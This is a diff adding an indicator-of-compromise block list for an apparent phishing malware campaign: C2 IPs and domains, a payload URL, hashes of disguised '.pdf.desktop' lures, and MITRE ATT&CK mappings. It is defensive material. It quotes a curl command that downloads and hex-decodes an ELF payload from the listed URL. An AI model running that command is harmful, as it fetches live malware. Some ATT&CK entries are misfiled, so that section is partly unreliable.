@@ -1,0 +1,145 @@
+# =============================================================================
+# IP ADDRESSES TO BLOCK
+# =============================================================================
+
+# C2 Infrastructure (Stealth Server)
+5.178.0.29
+161.97.82.97
+164.215.103.55
+
+# Administrative Panel Infrastructure
+45.141.58.199
+
+# Additional Infrastructure
+45.155.54.28
+
+# =============================================================================
+# DOMAINS TO BLOCK
+# =============================================================================
+
+# C2 Infrastructure Domains
+discoverlive.site
+seemysitelive.store
+
+# =============================================================================
+# URLs TO BLOCK
+# =============================================================================
+
+# Malware Download URLs
+https://drive.google.com/uc?export=download&id=1bhQoBEO08KaH7YI2hHIUkdBYGsOr8WFV
+
+# WebSocket C2 URLs
+ws://seemysitelive.store:8080/ws
+
+# =============================================================================
+# MALWARE HASHES TO BLOCK
+# =============================================================================
+
+# Linux Desktop Entry File (Draft_RFI_for_PDS_10_Aug_25_Final.PDF)
+# MD5 Hash
+c1a1e6e2ef0694180b865df321f99471
+
+# SHA1 Hash
+ead2ee01d13f42bbfab331aa178f07d8c1290479
+
+# SHA256 Hash
+ab85924ba95692995ac622172ed7f2ebc1997450d86f5245b03491422be2f3d6
+
+# ELF Binary (Hex encoded)
+# MD5 Hash
+84fa9ebb448b035917d1b87d52a49e62
+
+# SHA1 Hash
+6178f1b469af248fcd2408f7261c9fb6c8cdcf32
+
+# SHA256 Hash
+678c7f9ff4ef0f1dbe5a07885e244e8730f41e145256e1c17b5fdcd9892c8bb0
+
+# Additional Malware Files
+# File: PROCUREMENT_OF_MANPORTABLE_&_COMPAC.pdf.desktop
+# MD5 Hash
+a484f85d132609a4a6b5ed65ece7d331
+
+# SHA1 Hash
+1982f09bfab3a6688bb80249a079db1a759214b7
+
+# SHA256 Hash
+6347f46d77a47b90789a1209b8f573b2529a6084f858a27d977bf23ee8a79113
+
+# File: PROCUREMENT_OF_MANPORTABLE_&_COMPAC.pdf.zip
+# MD5 Hash
+6ac0fe0fa5d9af8193610d710a7da63c
+
+# SHA1 Hash
+3e3169c513c02126028480421fb341a167cb9fcd
+
+# SHA256 Hash
+34ad45374d5f5059cad65e7057ec0f3e468f00234be7c34de033093efc4dd83d
+
+# Additional Malware Hash
+# MD5 Hash
+566ddd4eb4ca8d4dd67b72ee7f944055
+
+# SHA1 Hash
+df4db969a69efc1db59f4d3c596ed590ee059777
+
+# SHA256 Hash
+7a946339439eb678316a124b8d700b21de919c81ee5bef33e8cb848b7183927b
+
+# =============================================================================
+# EMAIL ADDRESSES TO MONITOR
+# =============================================================================
+
+# Uploader Email Address
+bulldark453@gmail.com
+
+# =============================================================================
+# COMMAND LINE INDICATORS
+# =============================================================================
+
+# ELF Binary Download Command
+curl ${cDPUvX} "https://drive.google.com/uc?export=download&id=1bhQoBEO08KaH7YI2hHIUkdBYGsOr8WFV" | xxd -r -p
+
+# =============================================================================
+# MITRE ATT&CK TECHNIQUES
+# =============================================================================
+
+# Resource Development
+T1583.001 - Acquire Infrastructure->Domains
+T1584.001 - Compromise Infrastructure->Domains
+T1585.002 - Establish Accounts->Email Accounts
+
+# Initial Access
+T1566.001 - Phishing->Spearphishing Attachment
+
+# Execution
+T1059 - Command and Scripting Interpreter
+
+# Command and Control
+T1071.001 - Application Layer Protocol->Web Protocols
+T1105 - Ingress Tool Transfer
+
+# Defense Evasion
+T1027.001 - Obfuscated Files or Information->Binary Padding
+T1036 - Masquerading
+T1564.001 - Hide Artifacts->Hidden Files and Directories
+
+# Execution
+T1064 - Scripted Execution
+
+# Discovery
+T1518 - Software Discovery
+T1543.003 - Create or Modify System Process->Windows Service
+
+# Persistence
+T1543.003 - Create or Modify System Process->Windows Service
+
+# Initial Access
+T1204.002 - User Execution->Malicious File
+
+# Credential Access
+T1110 - Brute Force
+
+# Network Communication
+T1095 - Non-Application Layer Protocol
+T1571 - Non-Standard Port
